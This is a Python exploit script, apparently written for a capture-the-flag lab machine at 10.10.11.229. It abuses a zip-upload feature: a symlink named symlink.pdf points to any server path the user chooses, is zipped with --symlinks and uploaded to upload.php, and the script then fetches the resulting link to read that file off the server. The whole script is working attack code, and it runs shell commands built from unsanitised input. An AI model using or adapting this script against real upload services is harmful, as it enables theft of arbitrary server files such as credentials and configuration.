# in input prompt user will be passing a name of the file for which she/he want to create a symlink and later zip
# the script will be checking if file from input prompt exist on the server, if not the file will be created
# next, symlink will be created for this file
# next, zip will be created with --symlinks from this symlink file
# next, zip file will be uploaded, and the response will be returned on the console with curl

import os
import subprocess
import requests
import re

# ask for the filename with absolute path
user_input = input("Enter the filename with absolute path which you would like to upload: ")

# pdf file needed in zip command
pdf_file_name = "symlink.pdf"

# function to create a symlink
def create_symlink(command_create_symlink):
    create_symlink = subprocess.run(command_create_symlink, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return create_symlink.stdout, create_symlink.stderr

# function to create a file
def create_file(command_create_file):
    create_file = subprocess.run(command_create_file, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return create_file.stdout, create_file.stderr

# check if file exist, if not, create it
if os.path.exists(user_input):
    command_create_symlink_linux = f"ln -s {user_input} {pdf_file_name}"
    #command_create_symlink_linux = "ls"
    result, error = create_symlink(command_create_symlink_linux)
    print(result)
else:
    command_create_file_linux = f"touch {user_input}"
    create_file(command_create_file_linux)
    command_create_symlink_linux = f"ln -s {user_input} {pdf_file_name}"
    #command_create_symlink_linux = "whoami"
    result2, error2 = create_symlink(command_create_symlink_linux)
    print(result2)

# create a zip file from the symlink, symlink == user_input
def create_zip_from_symlink(command_create_zip):
    command_create_zip = subprocess.run(command_create_zip, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return command_create_zip.stdout, command_create_zip.stderr

command_create_zip = f"zip --symlink result.zip {pdf_file_name}"
zip = create_zip_from_symlink(command_create_zip)

# upload zip file on the website
url = "http://10.10.11.229/upload.php"
zip_file_path = "./result.zip"

with open(zip_file_path, 'rb') as f:
        file = f.read()
        f.close()
files=[
    ('zipFile',
        ('sym.zip',open(zip_file_path,'rb'),
            'application/octet-stream'))
]
data = {"submit": ""}
response = requests.post(url, data=data, files=files)
print(response.text)

# find url to the uploaded file in response.text

url_pattern = r'href="(uploads/[^"]+)"'

match = re.search(url_pattern, response.text)
if match:
    # Extract the URL
    extracted_url = match.group(1)
    print("Extracted URL:", extracted_url)
else:
    print("No URL found.")

base_url = "http://10.10.11.229/" 

def get_uploaded_file(command_get_file):
    get_file = subprocess.run(command_get_file, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return get_file.stdout, get_file.stderr
    
# print the result of the uploaded file
command_get_file = f"curl {base_url}{extracted_url}"
uploaded_file_output, uploaded_file_error = get_uploaded_file(command_get_file)
print(uploaded_file_output)




